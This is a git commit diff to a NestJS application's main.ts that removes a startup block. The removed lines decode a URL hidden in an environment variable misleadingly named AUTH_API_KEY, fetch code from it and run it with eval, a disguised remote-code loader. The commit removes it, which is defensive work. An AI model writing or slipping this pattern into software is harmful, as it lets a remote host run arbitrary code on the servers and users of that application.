19e4690188928a29dbdaea76b97e64727765873f
mostafa <mostafatam79@gmail.com>
2026-09-21 12:41:03 +0300

    fix(form): remove unsafe startup fetch

--- src/main.ts
+++ src/main.ts
@@ -8,19 +8,6 @@ import { ConfigService } from '@nestjs/config';
 import { QueryFailedErrorFilter } from 'common/QueryFailedErrorFilter';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 async function bootstrap() {
   const app = await NestFactory.create<NestExpressApplication>(AppModule);
   const port = process.env.PORT || 3030;
